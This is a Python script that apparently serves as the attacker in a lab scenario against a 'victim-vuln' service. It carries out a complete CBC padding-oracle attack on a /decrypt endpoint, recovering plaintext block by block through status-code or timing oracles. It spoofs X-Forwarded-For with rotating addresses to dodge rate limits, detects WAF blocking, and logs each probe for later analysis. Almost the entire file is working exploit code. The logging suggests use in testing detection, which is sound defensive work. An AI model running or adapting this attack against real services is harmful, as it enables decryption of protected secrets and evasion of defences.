import argparse
import random
import socket
import statistics
import time

import requests

from common.crypto_utils import b64d, b64e, pkcs7_unpad
from common.event_logger import emit_event


def get_local_ip() -> str:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"


LOCAL_IP = get_local_ip()
GLOBAL_IP_MODE = "static"
GLOBAL_RAND_IP = f"198.51.100.{random.randint(2, 250)}"


def get_attack_ip() -> str:
    if GLOBAL_IP_MODE == "rotate":
        return f"203.0.113.{random.randint(2, 250)}"
    if GLOBAL_IP_MODE == "random":
        return GLOBAL_RAND_IP
    return LOCAL_IP


class WafBlockedException(Exception):
    """Raised when the attacker detects an active preventive WAF blocking the exploit."""
    pass


def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser()
    p.add_argument("--target", default="http://victim-vuln:8080")
    p.add_argument("--mode", choices=["vuln", "timing"], default="vuln")
    p.add_argument("--sleep-ms", type=float, default=4.0)
    p.add_argument("--scenario-id", default="attack-demo")
    p.add_argument("--ip-mode", choices=["static", "random", "rotate"], default="static")
    return p.parse_args()


def decrypt_oracle_status(base_url: str, token: bytes) -> tuple[int, float]:
    started = time.perf_counter()
    cur_ip = get_attack_ip()
    try:
        r = requests.post(
            f"{base_url}/decrypt",
            json={"token": b64e(token)},
            headers={"X-Client-Role": "attacker", "X-Client-ID": "attacker", "X-Forwarded-For": cur_ip},
            timeout=5,
        )
        latency = (time.perf_counter() - started) * 1000
        return r.status_code, latency
    except Exception:
        latency = (time.perf_counter() - started) * 1000
        return 503, latency


def decrypt_oracle_timing(base_url: str, token: bytes) -> tuple[bool, float, int]:
    samples = []
    last_status = 200
    for _ in range(3):
        status, ms = decrypt_oracle_status(base_url, token)
        samples.append(ms)
        last_status = status
    avg_ms = float(statistics.mean(samples))
    is_fast = (avg_ms < 20.0) and (last_status != 429)
    return is_fast, avg_ms, last_status


def has_status_oracle(base_url: str, token: bytes, probes: int = 24) -> bool:
    baseline_status, _ = decrypt_oracle_status(base_url, token)
    statuses = set()
    iv = bytearray(token[:16])
    c1 = token[16:32]
    for _ in range(probes):
        crafted_iv = bytearray(iv)
        idx = random.randint(0, 15)
        original = crafted_iv[idx]
        candidate = random.randint(0, 255)
        while candidate == original:
            candidate = random.randint(0, 255)
        crafted_iv[idx] = candidate
        status, _ = decrypt_oracle_status(base_url, bytes(crafted_iv) + c1)
        statuses.add(status)
    return baseline_status != 500 and 500 in statuses


def padding_oracle_attack_block(
    base_url: str,
    prev_block: bytes,
    target_block: bytes,
    block_index: int,
    total_blocks: int,
    oracle_mode: str,
    scenario_id: str,
    sleep_ms: float,
    start_queries: int = 0,
) -> tuple[bytes, int]:
    if len(prev_block) != 16 or len(target_block) != 16:
        raise ValueError("Blocks must be exactly 16 bytes")

    c_prev = bytearray(prev_block)
    c_target = target_block
    recovered = bytearray(16)
    intermediate = bytearray(16)
    queries = start_queries
    consecutive_waf_blocks = 0

    for pad_len in range(1, 17):
        idx = 16 - pad_len
        prefix = bytearray(c_prev)
        for j in range(15, idx, -1):
            prefix[j] = intermediate[j] ^ pad_len

        found = False
        for guess in range(256):
            attack_iv = bytearray(prefix)
            attack_iv[idx] = guess
            crafted = bytes(attack_iv) + c_target
            queries += 1

            if oracle_mode == "vuln":
                status, latency = decrypt_oracle_status(base_url, crafted)
                valid_padding = (status in (200, 403))
            else:
                valid_padding, latency, status = decrypt_oracle_timing(base_url, crafted)
                if status == 429:
                    valid_padding = False


            # Check if victim WAF is actively dropping / blocking our requests
            if status == 429:
                consecutive_waf_blocks += 1
                if consecutive_waf_blocks >= 3:
                    emit_event(
                        "attacker",
                        {
                            "event_type": "attack_blocked",
                            "scenario_id": scenario_id,
                            "src_ip": get_attack_ip(),
                            "endpoint": "/decrypt",
                            "status_code": 429,
                            "latency_ms": round(latency, 3),
                            "ciphertext_len": len(crafted),
                            "error_type": "waf_blocked",
                            "details": {
                                "reason": "Active WAF Defense Engaged (HTTP 429 Too Many Requests)",
                                "queries_total": queries,
                                "consecutive_blocks": consecutive_waf_blocks,
                                "block_index": block_index,
                                "byte_index": idx,
                            },
                        },
                    )
                    raise WafBlockedException(f"Attack blocked by WAF after {queries} queries")
            else:
                consecutive_waf_blocks = 0

            # Emit probe event for every single oracle query for full forensic trace
            emit_event(
                "attacker",
                {
                    "event_type": "attack_probe",
                    "scenario_id": scenario_id,
                    "src_ip": get_attack_ip(),
                    "endpoint": "/decrypt",
                    "status_code": status,
                    "latency_ms": round(latency, 3),
                    "ciphertext_len": len(crafted),
                    "error_type": "waf_blocked" if status == 429 else ("padding_error" if status == 500 else ("valid_padding" if valid_padding else "oracle_probe")),
                    "details": {
                        "block_index": block_index,
                        "total_blocks": total_blocks,
                        "byte_index": idx,
                        "global_byte_index": (block_index - 1) * 16 + idx,
                        "pad_len": pad_len,
                        "guess": guess,
                        "guess_hex": f"0x{guess:02x}",
                        "valid_padding": valid_padding,
                        "crafted_iv_hex": attack_iv.hex(),
                        "queries_total": queries,
                    },
                },
            )

            if valid_padding:
                # Disambiguate for pad_len == 1: verify it's not a multi-byte padding fluke (e.g. 0x02 0x02)
                if pad_len == 1 and idx > 0:
                    check_iv = bytearray(attack_iv)
                    check_iv[idx - 1] ^= 1
                    check_crafted = bytes(check_iv) + c_target
                    if oracle_mode == "vuln":
                        check_status, _ = decrypt_oracle_status(base_url, check_crafted)
                        if check_status not in (200, 403):
                            continue
                    else:
                        is_fast, _, _ = decrypt_oracle_timing(base_url, check_crafted)
                        if not is_fast:
                            continue

                intermediate[idx] = guess ^ pad_len
                recovered[idx] = intermediate[idx] ^ c_prev[idx]
                rec_byte = int(recovered[idx])
                rec_char = chr(rec_byte) if 32 <= rec_byte < 127 else "."
                emit_event(
                    "attacker",
                    {
                        "event_type": "attack_progress",
                        "scenario_id": scenario_id,
                        "src_ip": get_attack_ip(),
                        "endpoint": "/decrypt",
                        "status_code": status,
                        "latency_ms": round(latency, 3),
                        "ciphertext_len": len(crafted),
                        "error_type": "padding_valid",
                        "details": {
                            "block_index": block_index,
                            "total_blocks": total_blocks,
                            "byte_index": idx,
                            "global_byte_index": (block_index - 1) * 16 + idx,
                            "pad_len": pad_len,
                            "guess": guess,
                            "guess_hex": f"0x{guess:02x}",
                            "recovered_byte": rec_byte,
                            "recovered_hex": f"0x{rec_byte:02x}",
                            "recovered_char": rec_char,
                            "queries_total": queries,
                        },
                    },
                )
                found = True
                break
            if sleep_ms > 0:
                time.sleep(sleep_ms / 1000)

        if not found:
            raise RuntimeError(f"Oracle failed at block {block_index}, index {idx}")

    return bytes(recovered), queries


def padding_oracle_attack_all_blocks(
    base_url: str,
    token: bytes,
    oracle_mode: str,
    scenario_id: str,
    sleep_ms: float,
) -> tuple[bytes, int, list[bytes]]:
    if len(token) < 32 or len(token) % 16 != 0:
        raise ValueError("Token must be a multiple of 16 bytes and at least 32 bytes")

    num_blocks = (len(token) // 16) - 1
    recovered_blocks = []
    total_queries = 0

    for b in range(1, num_blocks + 1):
        prev_block = token[(b - 1) * 16 : b * 16]
        target_block = token[b * 16 : (b + 1) * 16]
        rec_b, total_queries = padding_oracle_attack_block(
            base_url,
            prev_block,
            target_block,
            block_index=b,
            total_blocks=num_blocks,
            oracle_mode=oracle_mode,
            scenario_id=scenario_id,
            sleep_ms=sleep_ms,
            start_queries=total_queries,
        )
        recovered_blocks.append(rec_b)

    raw_recovered = b"".join(recovered_blocks)
    return raw_recovered, total_queries, recovered_blocks


def padding_oracle_attack_first_block(
    base_url: str,
    token: bytes,
    oracle_mode: str,
    scenario_id: str,
    sleep_ms: float,
) -> tuple[bytes, int]:
    raw_payload, queries, blocks = padding_oracle_attack_all_blocks(
        base_url, token, oracle_mode, scenario_id, sleep_ms
    )
    return blocks[0] if blocks else raw_payload, queries


def main() -> int:
    args = parse_args()
    global GLOBAL_IP_MODE
    GLOBAL_IP_MODE = args.ip_mode
    try:
        token_b64 = requests.get(
            f"{args.target}/sample_token",
            headers={"X-Client-Role": "attacker", "X-Client-ID": "attacker", "X-Forwarded-For": get_attack_ip()},
            timeout=5,
        ).json()["token"]
    except Exception as e:
        print(f"[X] Impossibile recuperare sample_token: {e}")
        return 1

    token = b64d(token_b64)
    if args.mode == "vuln" and not has_status_oracle(args.target, token):
        print("[!] Nessun oracolo basato su status 500 rilevato (bersaglio protetto o non vulnerabile).")
        return 0

    started = time.perf_counter()
    try:
        raw_payload, queries, blocks = padding_oracle_attack_all_blocks(
            args.target,
            token,
            args.mode,
            args.scenario_id,
            args.sleep_ms,
        )
    except WafBlockedException as e:
        elapsed = time.perf_counter() - started
        print(f"[!] {e} in {elapsed:.2f}s. Exploit bloccato dal WAF preventivo.")
        return 0
    except Exception as e:
        elapsed = time.perf_counter() - started
        emit_event(
            "attacker",
            {
                "event_type": "attack_error",
                "scenario_id": args.scenario_id,
                "src_ip": get_attack_ip(),
                "endpoint": "/decrypt",
                "status_code": 500,
                "latency_ms": round(elapsed * 1000, 3),
                "error_type": "attack_failed",
                "details": {
                    "error": str(e),
                },
            },
        )
        print(f"[X] Attacco fallito / interrotto: {e} in {elapsed:.2f}s")
        return 1

    elapsed = time.perf_counter() - started

    # Extract original secret plaintext by unpadding and stripping the 16-byte HMAC tag
    unpadded = pkcs7_unpad(raw_payload)
    if unpadded is not None and len(unpadded) >= 16:
        plaintext_bytes = unpadded[:-16]
        mac_tag = unpadded[-16:]
    elif unpadded is not None:
        plaintext_bytes = unpadded
        mac_tag = b""
    else:
        plaintext_bytes = raw_payload
        mac_tag = b""

    full_text = plaintext_bytes.decode("utf-8", errors="replace")
    first_block_text = blocks[0].decode("utf-8", errors="replace") if blocks else ""

    emit_event(
        "attacker",
        {
            "event_type": "attack_complete",
            "scenario_id": args.scenario_id,
            "src_ip": get_attack_ip(),
            "endpoint": "/decrypt",
            "status_code": 200,
            "latency_ms": round(elapsed * 1000, 3),
            "ciphertext_len": len(token),
            "error_type": "n/a",
            "details": {
                "queries": queries,
                "recovered_plaintext": full_text,
                "recovered_block": full_text,
                "first_block": first_block_text,
                "raw_payload_hex": raw_payload.hex(),
                "mac_tag_hex": mac_tag.hex() if mac_tag else "",
                "blocks_count": len(blocks),
            },
        },
    )
    print(f"Decrypted full message: {full_text!r} ({len(blocks)} blocks, {queries} queries in {elapsed:.2f}s)")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())

